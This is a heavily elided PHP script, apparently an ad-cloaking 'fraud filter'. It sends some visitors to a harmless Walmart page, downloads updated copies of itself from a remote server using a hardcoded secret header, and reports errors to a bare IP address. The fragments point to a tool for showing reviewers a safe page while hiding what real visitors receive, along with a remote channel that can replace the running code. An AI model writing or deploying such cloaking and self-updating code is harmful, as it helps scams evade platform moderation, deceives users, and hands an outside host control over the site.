...
class FraudFilterDetector_ne13g {
    ...
    function isSignatureValid($sign, $time) {
        $str = '3cd32479-8b78-43e6-97e6-4614cbe0e70e.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.walmart.com/browse/clothing/baby-kids-shoes/5438_1045804_1045805');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 3cd32479-8b78-43e6-97e6-4614cbe0e70e',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 3cd32479-8b78-43e6-97e6-4614cbe0e70e';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 3cd32479-8b78-43e6-97e6-4614cbe0e70e';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=ne13g&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_ne13g = new FraudFilterDetector_ne13g();
$fraudFilterDetector_ne13g->check();
